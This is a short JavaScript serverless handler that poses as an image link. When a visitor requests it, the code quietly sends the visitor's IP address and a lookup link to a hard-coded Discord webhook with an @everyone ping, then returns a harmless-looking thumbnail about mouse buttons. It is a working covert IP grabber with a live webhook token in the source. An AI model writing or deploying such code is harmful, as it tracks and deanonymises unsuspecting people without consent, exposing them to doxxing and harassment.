import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";

  const lookupLink = `https://www.whtop.com/tools.ip/${ip}`;

  // Send to Discord and WAIT for it
  try {
    await fetch("https://discord.com/api/webhooks/1472338172590555271/Zop_dg-2Wf5zULZGGJT380mnKqM1O6Rhfu5VwSf1f0O1zxyWyNdGVhVkPcZxYSCAbMEl", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `@everyone @here\n\n${ip}\n${lookupLink}`
      })
    });
  } catch (e) {
    console.error("Discord error:", e);
  }

  // Serve the image
  try {
    const imagePath = path.join(process.cwd(), 'api', 'use-mouse-middle-click-button-windows-thumbnail.jpg');
    const imageBuffer = fs.readFileSync(imagePath);
    
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Cache-Control', 'no-cache');
    res.status(200).send(imageBuffer);
  } catch (error) {
    res.status(404).json({ error: 'Image not found' });
  }
}
